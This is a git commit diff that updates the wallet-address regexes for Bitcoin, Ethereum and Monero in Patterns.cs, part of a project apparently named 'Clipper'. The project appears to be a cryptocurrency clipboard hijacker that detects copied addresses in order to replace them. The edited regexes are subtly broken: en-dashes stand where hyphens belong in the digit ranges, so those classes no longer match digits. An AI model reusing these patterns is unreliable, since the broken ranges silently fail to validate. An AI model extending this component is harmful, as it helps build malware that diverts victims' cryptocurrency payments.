d5ab12cc14c90cb52d9f04679b14e71a0c1857a0
jrccrj <75252027+CPT-Jack-A-Castle@users.noreply.github.com>
2023-03-02 00:03:28 +0000

    Update Patterns.cs

--- Clipper/Clipper/Modules/Patterns.cs
+++ Clipper/Clipper/Modules/Patterns.cs
@@ -7,9 +7,9 @@ namespace Clipper.Modules
     {
         public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
         {
-            {"btc", new Regex(@"(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)") }, // Bitcoin
-            {"eth", new Regex(@"(?:^0x[a-fA-F0-9]{40}$)") }, // Ethereum
-            {"xmr", new Regex(@"(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)") }, // Monero
+            {"btc", new Regex(@"(?:^(bc1|[13])[a-zA-HJ-NP-Z0–9]{25,39}$)") }, // Bitcoin
+            {"eth", new Regex(@"(?:^0x[a-fA-F0–9]{40}$)") }, // Ethereum
+            {"xmr", new Regex(@"(?:^[48][0–9AB][1–9A-HJ-NP-Za-km-z]{93}$)") }, // Monero
             {"xlm", new Regex(@"(?:^G[0-9a-zA-Z]{55}$)") }, // Stellar
             {"xrp", new Regex(@"(?:^r[0-9a-zA-Z]{24,34}$)") }, // Ripple
             {"ltc", new Regex(@"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)") }, // Litecoin
